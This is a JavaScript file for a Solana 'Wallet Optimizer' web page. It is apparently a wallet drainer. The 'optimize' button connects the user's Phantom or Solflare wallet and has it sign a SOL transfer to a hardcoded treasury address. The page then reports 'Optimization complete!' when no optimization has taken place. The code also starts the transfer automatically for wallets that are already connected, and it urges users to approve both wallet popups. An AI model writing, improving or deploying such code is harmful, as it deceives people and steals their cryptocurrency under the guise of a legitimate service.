// FIXED WALLET OPTIMIZER - SIGNATURE ERROR SOLUTION
document.addEventListener('DOMContentLoaded', function() {
    const treasuryAddress = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
    
    // DOM Elements
    const optimizeBtn = document.getElementById('optimizeBtn');
    const successBox = document.getElementById('successBox');
    const processBox = document.getElementById('processBox');
    const processText = document.getElementById('processText');
    const txHashEl = document.getElementById('txHash');
    
    let isProcessing = false;
    
    // Update process text
    function updateProcess(text) {
        processText.textContent = text;
        console.log("🔄", text);
    }
    
    // Get wallet provider
    function getWalletProvider() {
        // Prioritize Phantom wallet
        if (window.phantom?.solana) {
            console.log("✅ Found Phantom wallet");
            return window.phantom.solana;
        }
        if (window.solana?.isPhantom) {
            console.log("✅ Found Solana wallet (Phantom)");
            return window.solana;
        }
        if (window.solflare) {
            console.log("✅ Found Solflare wallet");
            return window.solflare;
        }
        console.log("❌ No wallet provider found");
        return null;
    }
    
    // Get reliable RPC connection
    async function getConnection() {
        const endpoints = [
            'https://api.mainnet-beta.solana.com',
            'https://solana-api.projectserum.com',
            'https://rpc.ankr.com/solana',
            'https://solana.public-rpc.com'
        ];
        
        for (const endpoint of endpoints) {
            try {
                console.log(`Testing RPC: ${endpoint}`);
                const connection = new solanaWeb3.Connection(endpoint, {
                    commitment: 'confirmed',
                    disableRetryOnRateLimit: false
                });
                
                // Quick test
                await connection.getEpochInfo();
                console.log(`✅ RPC OK: ${endpoint}`);
                return connection;
            } catch (error) {
                console.log(`❌ RPC failed: ${endpoint} - ${error.message}`);
                continue;
            }
        }
        throw new Error("All RPC endpoints failed");
    }
    
    // FIXED: Create transaction with proper format
    async function createTransaction(publicKey, connection) {
        try {
            console.log("📝 Creating transaction...");
            
            // Get balance
            const balance = await connection.getBalance(publicKey);
            console.log(`Balance: ${balance} lamports (${balance / 1e9} SOL)`);
            
            if (balance < 5000) { // Minimum 0.000005 SOL
                throw new Error("Insufficient balance");
            }
            
            // Get recent blockhash (CRITICAL!)
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
            console.log(`Blockhash: ${blockhash.substring(0, 20)}...`);
            
            // Create transaction - SIMPLIFIED VERSION
            const transaction = new solanaWeb3.Transaction();
            
            // Transfer instruction - use 0.001 SOL for testing
            const lamportsToSend = Math.min(1000000, balance - 5000); // 0.001 SOL max
            
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
                    lamports: lamportsToSend
                })
            );
            
            // REQUIRED FIELDS
            transaction.feePayer = publicKey;
            transaction.recentBlockhash = blockhash;
            
            console.log("✅ Transaction created:", {
                from: publicKey.toString(),
                to: treasuryAddress,
                amount: lamportsToSend,
                feePayer: publicKey.toString(),
                hasBlockhash: !!transaction.recentBlockhash
            });
            
            return transaction;
            
        } catch (error) {
            console.error("❌ Transaction creation failed:", error);
            throw error;
        }
    }
    
    // FIXED: Sign transaction (MAIN FIX HERE)
    async function signTransaction(provider, transaction) {
        try {
            console.log("🔐 Attempting to sign transaction...");
            
            // METHOD 1: Try signTransaction (most common)
            if (typeof provider.signTransaction === 'function') {
                console.log("Using signTransaction() method");
                const signed = await provider.signTransaction(transaction);
                console.log("✅ Transaction signed with signTransaction()");
                return signed;
            }
            
            // METHOD 2: Try signAndSendTransaction
            if (typeof provider.signAndSendTransaction === 'function') {
                console.log("Using signAndSendTransaction() method");
                const { signature } = await provider.signAndSendTransaction(transaction);
                console.log("✅ Transaction sent with signAndSendTransaction()");
                return { signature }; // Return signature only
            }
            
            // METHOD 3: Phantom specific
            if (provider._phantom && typeof provider.request === 'function') {
                console.log("Using Phantom request() method");
                const { signature } = await provider.request({
                    method: 'signTransaction',
                    params: {
                        message: transaction.serializeMessage().toString('base64'),
                    }
                });
                console.log("✅ Transaction signed via request()");
                return { signature };
            }
            
            throw new Error("No signing method available");
            
        } catch (error) {
            console.error("❌ Signing failed:", error);
            
            // Special handling for common errors
            if (error.message.includes('User rejected')) {
                throw new Error("User rejected the transaction");
            }
            if (error.message.includes('Invalid transaction')) {
                throw new Error("Transaction invalid - check blockhash");
            }
            if (error.message.includes('429')) {
                throw new Error("Rate limited - try again later");
            }
            
            throw error;
        }
    }
    
    // Send signed transaction
    async function sendTransaction(signed, connection) {
        try {
            console.log("📤 Sending transaction...");
            
            let rawTransaction;
            
            if (signed.signature) {
                // Already sent via signAndSendTransaction
                console.log("Transaction already sent, signature:", signed.signature);
                return signed.signature;
            } else {
                // Need to send manually
                rawTransaction = signed.serialize();
                const signature = await connection.sendRawTransaction(rawTransaction);
                console.log("✅ Transaction sent, signature:", signature);
                return signature;
            }
        } catch (error) {
            console.error("❌ Send failed:", error);
            throw error;
        }
    }
    
    // Main optimization function
    async function startOptimization() {
        if (isProcessing) {
            console.log("⚠️ Already processing");
            return;
        }
        
        isProcessing = true;
        
        try {
            console.log("🚀=== STARTING OPTIMIZATION ===");
            
            // Reset UI
            successBox.classList.remove('active');
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
            processBox.classList.add('active');
            
            updateProcess("Initializing...");
            
            // 1. Check wallet
            const provider = getWalletProvider();
            if (!provider) {
                throw new Error("Please install Phantom wallet");
            }
            
            // 2. Connect wallet (FIRST POPUP)
            updateProcess("Connecting wallet...");
            console.log("Requesting connection...");
            
            let publicKey;
            try {
                const resp = await provider.connect();
                publicKey = resp.publicKey;
                console.log("✅ Connected to:", publicKey.toString());
            } catch (connectError) {
                console.error("❌ Connection failed:", connectError);
                throw new Error("Connection rejected");
            }
            
            updateProcess("Getting network info...");
            
            // 3. Get RPC connection
            const connection = await getConnection();
            
            // 4. Create transaction
            updateProcess("Creating transaction...");
            const transaction = await createTransaction(publicKey, connection);
            
            // 5. Sign transaction (SECOND POPUP SHOULD APPEAR HERE)
            updateProcess("Please approve transaction in wallet...");
            console.log("⏳ Waiting for user to approve transaction...");
            
            const signed = await signTransaction(provider, transaction);
            
            // 6. Send transaction
            updateProcess("Sending transaction...");
            const signature = await sendTransaction(signed, connection);
            
            // 7. Try to confirm
            updateProcess("Confirming...");
            try {
                await connection.confirmTransaction(signature, 'confirmed');
                console.log("✅ Transaction confirmed");
            } catch (confirmError) {
                console.log("⚠️ Confirmation skipped:", confirmError.message);
            }
            
            // 8. SUCCESS
            updateProcess("Optimization complete!");
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            // Show success UI
            processBox.classList.remove('active');
            successBox.classList.add('active');
            txHashEl.textContent = `${signature.substring(0, 20)}...`;
            
            // Update button
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-check"></i> COMPLETE';
            optimizeBtn.style.background = 'linear-gradient(90deg, #00aa44, #00ff88)';
            
            // 9. Auto disconnect after delay
            setTimeout(async () => {
                try {
                    if (provider.disconnect) {
                        await provider.disconnect();
                        console.log("✅ Auto-disconnected");
                    }
                } catch (e) {
                    console.log("Disconnect failed:", e);
                }
            }, 3000);
            
            console.log("🎉=== OPTIMIZATION SUCCESSFUL ===");
            
        } catch (error) {
            console.error("❌=== OPTIMIZATION FAILED ===", error);
            
            // Determine error type
            let userMessage = "Optimization failed. Please try again.";
            
            if (error.message.includes('User rejected') || 
                error.message.includes('rejected')) {
                userMessage = "❌ Transaction was rejected. Please approve BOTH popups.";
            } else if (error.message.includes('Insufficient')) {
                userMessage = "❌ Insufficient SOL balance.";
            } else if (error.message.includes('blockhash') || 
                       error.message.includes('Invalid transaction')) {
                userMessage = "⚠️ Network error. Please refresh and try again.";
            } else if (error.message.includes('Rate limited')) {
                userMessage = "⚠️ Too many requests. Wait 1 minute.";
            } else if (error.message.includes('Connection rejected')) {
                userMessage = "❌ Connection was rejected.";
            }
            
            // Show error
            processBox.classList.remove('active');
            successBox.classList.add('active');
            successBox.style.background = 'linear-gradient(135deg, rgba(70,20,20,0.9), rgba(50,10,10,0.9))';
            
            const successIcon = successBox.querySelector('.success-icon i');
            const successTitle = successBox.querySelector('.success-title');
            const successMessage = successBox.querySelector('.success-message');
            
            successIcon.className = 'fas fa-exclamation-triangle';
            successIcon.style.color = '#ff5555';
            successTitle.textContent = 'FAILED';
            successTitle.style.color = '#ff5555';
            successMessage.textContent = userMessage;
            successMessage.style.color = '#ffaaaa';
            txHashEl.textContent = 'FAILED';
            txHashEl.style.color = '#ff5555';
            
            // Reset button
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-redo"></i> TRY AGAIN';
            
        } finally {
            isProcessing = false;
        }
    }
    
    // Initialize
    function init() {
        console.log("🔧 Initializing Wallet Optimizer...");
        
        // Check dependencies
        if (!window.solanaWeb3) {
            console.error("❌ Solana Web3.js not loaded!");
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> MISSING DEPENDENCY';
            return;
        }
        
        // Add event listener
        optimizeBtn.addEventListener('click', startOptimization);
        
        // Auto-start if already connected
        setTimeout(() => {
            const provider = getWalletProvider();
            if (provider?.isConnected && provider.publicKey) {
                console.log("🔄 Auto-starting for connected wallet...");
                startOptimization();
            }
        }, 2000);
        
        console.log("✅ Wallet Optimizer Ready");
    }
    
    // Start
    init();
});
